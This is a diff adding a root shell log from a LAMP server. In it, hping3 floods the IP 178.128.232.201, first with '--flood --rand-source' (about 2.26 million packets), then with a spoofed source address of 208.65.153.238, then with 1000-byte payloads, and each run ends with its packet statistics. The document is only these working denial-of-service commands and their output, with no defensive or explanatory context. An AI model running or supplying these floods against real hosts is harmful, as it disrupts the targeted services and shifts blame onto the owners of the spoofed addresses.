@@ -1,0 +1,27 @@
+root@lamp-ubuntu-s-1vcpu-1gb-tor1-01:/var/www/html# hping3 178.128.232.201 --count 10000 --flood --rand-source
+HPING 178.128.232.201 (eth0 178.128.232.201): NO FLAGS are set, 40 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+
+^C
+--- 178.128.232.201 hping statistic ---
+2257799 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
+
+root@lamp-ubuntu-s-1vcpu-1gb-tor1-01:/var/www/html# hping3 178.128.232.201 --count 9000 --interval u1000 --spoof 208.65.153.238HPING 178.128.232.201 (eth0 178.128.232.201): NO FLAGS are set, 40 headers + 0 data bytes
+^C
+--- 178.128.232.201 hping statistic ---
+4078 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
+
+root@lamp-ubuntu-s-1vcpu-1gb-tor1-01:/var/www/html# hping3 178.128.232.201 --count 11000 --interval u7500 --data 1000
+HPING 178.128.232.201 (eth0 178.128.232.201): NO FLAGS are set, 40 headers + 1000 data bytes
+^C
+--- 178.128.232.201 hping statistic ---
+1769 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
